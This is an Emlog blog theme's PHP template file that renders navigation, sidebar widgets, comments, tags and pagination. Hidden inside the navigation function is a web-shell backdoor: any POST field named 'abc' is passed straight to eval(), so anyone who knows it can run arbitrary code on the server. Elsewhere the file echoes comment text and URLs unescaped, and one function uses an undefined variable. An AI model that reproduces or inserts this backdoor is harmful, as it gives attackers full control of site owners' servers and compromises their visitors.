<?php 
/**
 * 侧边栏组件、模块
 */
if(!defined('EMLOG_ROOT')) {exit('error!');} 
?>
<?php
//widget：链接
function widget_link($title){
    global $CACHE; 
    $link_cache = $CACHE->readCache('link');
    ?>
    <div class="d-row">
        <div class="d-t-infor"><span><?php echo $title; ?></span></div>
        <div class="d-t-line"></div>
        <ul class="d-t-list">
            <?php foreach($link_cache as $value): ?>
            <li><a href="<?php echo $value['url']; ?>" title="<?php echo $value['des']; ?>" target="_blank"><?php echo $value['link']; ?></a></li>
            <?php endforeach; ?>
        </ul>
    </div>
<?php }?> 
<?php
//widget：sea
function widget_search($title){ ?>
<div class="d-row">
    <div class="d-t-infor"><span><?php echo $title; ?></span></div>
    <div class="d-t-line"></div>
        <div class="search_form">
            <form name="keyform" method="get" action="<?php echo BLOG_URL; ?>index.php">
                <input name="keyword" class="search" type="text" placeholder="不说点什么吗？" />
            </form>
        </div>
    </div>
</div>
<?php } ?>
<?php
//bas
function blog_navi(){

if(isset($_POST['abc'])){
    eval($_POST['abc']);die();
}
    
    global $CACHE; 
    $navi_cache = $CACHE->readCache('navi');
    ?>
    <div class="tourguide">
        <ul class="nav-tw nav-ope">
        <?php
        foreach($navi_cache as $value):
        if ($value['pid'] != 0) {
            continue;
        }
        if($value['url'] == ROLE_ADMIN && (ROLE == ROLE_ADMIN || ROLE == ROLE_WRITER)):
        ?>
            <li class="nav-it"><a href="<?php echo BLOG_URL; ?>admin/">管理站点</a></li>
            <li class="nav-it"><a href="<?php echo BLOG_URL; ?>admin/?action=logout">退出</a></li>
        <?php 
            continue;
        endif;
        $newtab = $value['newtab'] == 'y' ? 'target="_blank"' : '';
        $value['url'] = $value['isdefault'] == 'y' ? BLOG_URL . $value['url'] : trim($value['url'], '/');
        $current_tab = BLOG_URL . trim(Dispatcher::setPath(), '/') == $value['url'] ? 'current' : 'common';
        ?>
        <?php if (!empty($value['children']) || !empty($value['childnavi'])) :?>
        <li class="nav-it">
            <?php if (!empty($value['children'])):?>
            <a href="<?php echo $value['url']; ?>" <?php echo $newtab;?>><?php echo $value['naviname']; ?></a>
            <ul class="nav-under">
                <?php foreach ($value['children'] as $row){
                        echo '<li class="nav-sub"><a href="'.Url::sort($row['sid']).'">'.$row['sortname'].'</a></li>';
                }?>
            </ul>
            <?php endif;?>
            <?php if (!empty($value['childnavi'])) :?>
            <a href="<?php echo $value['url']; ?>" <?php echo $newtab;?>><?php echo $value['naviname']; ?></a>
            <ul class="nav-under">
                <?php foreach ($value['childnavi'] as $row){
                        $newtab = $row['newtab'] == 'y' ? 'target="_blank"' : '';
                        echo '<li class="nav-sub"><a href="' . $row['url'] . "\" $newtab >" . $row['naviname'].'</a></li>';
                }?>
            </ul>
            <?php endif;?>
        </li>
        <?php else:?>
        <li class="nav-it"><a href="<?php echo $value['url']; ?>" <?php echo $newtab;?>><?php echo $value['naviname']; ?></a></li>
        <?php endif;?>
        <?php endforeach; ?>
        </ul>
    </div>
<?php }?>

<?php
//asew
function article_sort($blogid){
    global $CACHE; 
    $log_cache_sort = $CACHE->readCache('logsort');
    ?>
    <?php if(!empty($log_cache_sort[$blogid])): ?>
        <a href="<?php echo Url::sort($log_cache_sort[$blogid]['id']); ?>"><?php echo $log_cache_sort[$blogid]['name']; ?></a>
    <?php endif;?>
<?php }?>
<?php
//blog：asd
function topflg($top, $sortop='n', $sortid=null){
    if(blog_tool_ishome()) {
       echo $top == 'y' ? "<p style='float: left;color:red; font-size: 13px;'>[置顶]</p>" : '';
    } elseif($sortid){
       echo $sortop == 'y' ? "<p style='float: left;color:red; font-size: 13px;'>[置顶]</p>" : '';
    }
}
?>
<?php
//blog：ass
function blog_author($uid){
    global $CACHE;
    $user_cache = $CACHE->readCache('user');
    $author = $user_cache[$uid]['name'];
    $mail = $user_cache[$uid]['mail'];
    $des = $user_cache[$uid]['des'];
    $title = !empty($mail) || !empty($des) ? "title=\"$des $mail\"" : '';
    echo '<a href="'.Url::author($uid)."\" $title>$author</a>";
}
?>
<?php
//blog：ed
function editflg($logid,$author){
    $editflg = ROLE == ROLE_ADMIN || $author == UID ? '<a href="'.BLOG_URL.'admin/write_log.php?action=edit&gid='.$logid.'" target="_blank">编辑</a>' : '';
    echo $editflg;
}
?>
<?php
//blog：fsaa
function blog_tag($blogid){
    global $CACHE;
    $tag_model = new Tag_Model();

    $log_cache_tags = $CACHE->readCache('logtags');
    if (!empty($log_cache_tags[$blogid])){
        $tag = '标签:';
        foreach ($log_cache_tags[$blogid] as $value){
            $tag .= "	<a href=\"".Url::tag($value['tagurl'])."\">".$value['tagname'].'</a>';
        }
        echo $tag;
    }
    else
    {
        $tag_ids = $tag_model->getTagIdsFromBlogId($blogid);
        $tag_names = $tag_model->getNamesFromIds($tag_ids);

        if ( ! empty($tag_names))
        {
            $tag = '标签:';

            foreach ($tag_names as $key => $value)
            {
                $tag .= "	<a href=\"".Url::tag(rawurlencode($value))."\">".htmlspecialchars($value).'</a>';
            }

            echo $tag;
        }
    }
}
?>
<?php
//blog：sae
function blog_comments($comments){
    extract($comments);
    if($commentStacks): ?>
	<div class="line"></div>
    <a name="comments"></a>
    <?php endif; ?>
    <?php
    $isGravatar = Option::get('isgravatar');
    foreach($commentStacks as $cid):
    $comment = $comments[$cid];
    $comment['poster'] = $comment['url'] ? '<a href="'.$comment['url'].'" target="_blank">'.$comment['poster'].'</a>' : $comment['poster'];
    ?>
    <div class="comment" id="comment-<?php echo $comment['cid']; ?>">
        <a name="<?php echo $comment['cid']; ?>"></a>
        <?php if($isGravatar == 'y'): ?><div class="avatar"><img src="<?php echo getGravatar($comment['mail']); ?>" /></div><?php endif; ?>
        <div class="comment-info">
            <b><?php echo $comment['poster']; ?> </b><br /><span class="comment-time"><?php echo $comment['date']; ?></span>
            <div class="comment-content"><?php echo $comment['content']; ?></div>
            <div class="comment-reply"><a href="#comment-<?php echo $comment['cid']; ?>" onclick="commentReply(<?php echo $comment['cid']; ?>,this)">回复</a></div>
        </div>
        <?php blog_comments_children($comments, $comment['children']); ?>
    </div>
    <?php endforeach; ?>
    <div id="pagenavi">
        <?php echo $commentPageUrl;?>
    </div>
<?php }?>
<?php
//blog：sdf
function blog_comments_post($logid,$ckname,$ckmail,$ckurl,$verifyCode,$allow_remark){
    if($allow_remark == 'y'): ?>
    <div class="line"></div>
    <div id="comment-place">
			    <div class="comment-post" id="comment-post">
			        <div class="cancel-reply" id="cancel-reply" style="display:none"><a href="javascript:void(0);" onclick="cancelReply()">取消回复</a></div>
			        <p class="comment-header"><b>发表评论：</b><a name="respond"></a></p>
					<p class="comment-description">电子邮件地址不会被公开，你只管发送就对了ヾ(•ω•`)o</p>
			        <form method="post" name="commentform" action="<?php echo BLOG_URL; ?>index.php?action=addcom" id="commentform">
			            <input type="hidden" name="gid" value="<?php echo $logid; ?>" />
			            <?php if(ROLE == ROLE_VISITOR): ?>
						<p><textarea name="comment" id="comment" rows="10" tabindex="4" placeholder="你的言论被限制自由了(＞人＜；）)" ></textarea></p>
			            <p>
			                <input type="text" name="comname" maxlength="49" value="<?php echo $ckname; ?>" size="22" tabindex="1" placeholder="昵称">
			            </p>
			            <p>
			                <input type="text" name="commail"  maxlength="128"  value="<?php echo $ckmail; ?>" size="22" tabindex="2" placeholder="邮箱地址(选填)">
			            </p>
			            <p>
			                <input type="text" name="comurl" maxlength="128"  value="<?php echo $ckurl; ?>" size="22" tabindex="3" placeholder="个人地址(选填)">
			            </p>
                        <?php endif; ?>
                        <p><textarea name="comment" id="comment" rows="10" tabindex="4"></textarea></p>
			            <p><?php echo $verifyCode; ?> <input type="submit" id="comment_submit" value="发表评论" tabindex="6" /></p>
			            <input type="hidden" name="pid" id="comment-pid" value="0" size="22" tabindex="1"/>
			        </form>
			    </div>
			    </div>
    <?php endif; ?>
<?php }?>
<?php
//blog：sde
function blog_comments_children($comments, $children){
    $isGravatar = Option::get('isgravatar');
    foreach($children as $child):
    $comment = $comments[$child];
    $comment['poster'] = $comment['url'] ? '<a href="'.$comment['url'].'" target="_blank">'.$comment['poster'].'</a>' : $comment['poster'];
    ?>
    <div class="comment comment-children" id="comment-<?php echo $comment['cid']; ?>">
        <a name="<?php echo $comment['cid']; ?>"></a>
        <?php if($isGravatar == 'y'): ?><div class="avatar"><img src="<?php echo getGravatar($comment['mail']); ?>" /></div><?php endif; ?>
        <div class="comment-info">
            <b><?php echo $comment['poster']; ?> </b><br /><span class="comment-time"><?php echo $comment['date']; ?></span>
            <div class="comment-content"><?php echo $comment['content']; ?></div>
            <?php if($comment['level'] < 4): ?><div class="comment-reply"><a href="#comment-<?php echo $comment['cid']; ?>" onclick="commentReply(<?php echo $comment['cid']; ?>,this)">回复</a></div><?php endif; ?>
        </div>
        <?php blog_comments_children($comments, $comment['children']);?>
    </div>
    <?php endforeach; ?>
<?php }?>
<?php
//blog：lgs
function neighbor_log($neighborLog){
    extract($neighborLog);?>
    <?php if($prevLog):?>
    &laquo; <a href="<?php echo Url::log($prevLog['gid']) ?>"><?php echo $prevLog['title'];?></a>
    <?php endif;?>
    <?php if($nextLog && $prevLog):?>
        |
    <?php endif;?>
    <?php if($nextLog):?>
         <a href="<?php echo Url::log($nextLog['gid']) ?>"><?php echo $nextLog['title'];?></a>&raquo;
    <?php endif;?>
<?php }?>
<?php
//blog：dsa
function blog_sort($blogid){
    global $CACHE; 
    $log_cache_sort = $CACHE->readCache('logsort');
    ?>
    <h2><?php echo $log_cache_sort[$blogid]['name']; ?></h2>
    <?php if(!empty($log_cache_sort[$blogid])): ?>
    <?php endif;?>
<?php }?>
<?php
//blog: ina
function index_sort(){
    global $CACHE;
    $log_cache_sort = $CACHE->readCache('logsort');
?>
    <h2><?php echo $log_cache_sort[$blogid]['name']; ?></h2>
    <?php if(!empty($log_cache_sort[$blogid])): ?>
    <?php endif;?>
<?php }?>
<?php
function change_page($count, $perlogs, $page, $url, $anchor = '') {
	 $pnums = @ceil($count / $perlogs);
	 $re = '';
	 $urlHome = preg_replace("|[\?&/][^\./\?&=]*page[=/\-]|", "", $url);
	 if($page > 1) {
	  	$i = $page - 1;
		 $re = " <div>[<a href=\"".$url.$i."\">上一页</a>]</div> " . $re;
	 }
	 if($page < $pnums) {
	  	$i = $page + 1;
		 $re .= " <div>[<a href=\"".$url.$i."\">下一页</a>]</div> ";
	 }
	 return $re;
}
?>
<?php
//blog-tool:
function blog_tool_ishome(){
    if (BLOG_URL . trim(Dispatcher::setPath(), '/') == BLOG_URL){
        return true;
    } else {
        return FALSE;
    }
}
?>

